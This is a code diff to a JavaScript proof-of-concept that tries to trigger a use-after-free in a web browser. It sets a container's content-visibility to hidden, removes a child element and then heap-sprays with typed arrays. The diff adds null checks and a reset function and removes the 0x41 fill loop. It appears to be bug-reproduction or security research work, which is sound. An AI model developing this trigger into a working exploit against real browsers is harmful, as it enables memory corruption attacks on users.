@@ -1,21 +1,28 @@
 import { debug_log } from './module/utils.mjs';
 
-const container = document.querySelector(".container");
-const child = document.querySelector(".child");
+let container = document.querySelector(".container");
+let child = document.querySelector(".child");
 
 function heapSpray() {
   let spray = [];
   for (let i = 0; i < 10000; i++) {
     let arr = new Uint8Array(0x1000);
-    for (let j = 0; j < arr.length; j++) {
-      arr[j] = 0x41;
-    }
     spray.push(arr);
   }
   return spray;
 }
 
 export function triggerUAF() {
+  container = document.querySelector(".container");
+  child = document.querySelector(".child");
+  if (!container) {
+    debug_log("No container found.");
+    return;
+  }
+  if (!child) {
+    debug_log("No child found, nothing to remove.");
+    return;
+  }
   container.style.contentVisibility = "hidden";
   child.remove();
   setTimeout(() => {
@@ -23,6 +30,18 @@ export function triggerUAF() {
     let spray = heapSpray();
     debug_log("UAF triggered, check for crash or memory corruption.");
   }, 0);
+}
+
+export function resetPoC() {
+  container = document.querySelector(".container");
+  if (!container.querySelector(".child")) {
+    let newChild = document.createElement("div");
+    newChild.className = "child";
+    container.appendChild(newChild);
+    debug_log("PoC reset: child re-added.");
+  } else {
+    debug_log("Child already present, nothing reset.");
+  }
 }
 
 const observer = new MutationObserver(() => {
